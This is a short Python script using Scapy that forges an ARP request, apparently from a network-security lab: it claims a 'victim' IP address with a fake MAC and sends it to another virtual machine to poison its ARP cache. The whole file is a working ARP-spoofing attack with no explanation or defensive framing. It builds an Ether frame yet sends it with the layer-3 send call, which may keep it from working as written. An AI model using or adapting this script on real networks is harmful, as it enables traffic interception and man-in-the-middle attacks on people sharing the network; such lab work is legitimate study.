#!/usr/bin/python3
from scapy.all import*

VM_A_IP="192.168.100.5"
VM_A_MAC="08:00:27:f2:d3:23"
VICTIM_IP="192.168.100.3"
FAKE_MAC="08:00:27:ca:dc:c1"

print("Sending ARP req.")

ether=Ether()
ether.dst=VM_A_MAC
ether.src=FAKE_MAC

arp=ARP()
arp.psrc=VICTIM_IP
arp.hwsrc=FAKE_MAC
arp.pdst=VM_A_IP
arp.op=1
frame=ether/arp
send(frame)
